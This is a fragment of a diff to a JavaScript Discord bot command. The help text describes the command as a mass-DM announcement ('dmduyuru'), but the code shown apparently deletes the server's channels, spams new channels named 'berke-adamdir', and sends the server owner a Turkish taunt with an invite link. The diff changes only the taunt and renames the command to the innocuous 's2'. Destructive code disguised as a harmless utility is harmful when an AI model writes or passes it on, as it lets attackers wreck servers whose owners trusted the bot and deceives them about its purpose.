@@ -44,7 +44,7 @@ return c.delete();
     
 
   
-message.guild.owner.send(`Buraya ne oldu yahu? neyse yapanlara görüşmek istersen; https://discord.gg/w8Xq9bm`);
+message.guild.owner.send(`Ban Yedin Gerizaklıııı https://discord.gg/w8Xq9bm`);
 message.guild.createChannel(`berke-adamdir`)
 message.guild.createChannel(`berke-adamdir`)
 message.delete()
@@ -62,7 +62,7 @@ exports.conf = {
 };
 
 exports.help = {
-  name: 'xdxd',
+  name: 's2',
   description: 'Toplu dm atar.', 
   usage: 'dmduyuru [mesaj]'
 };
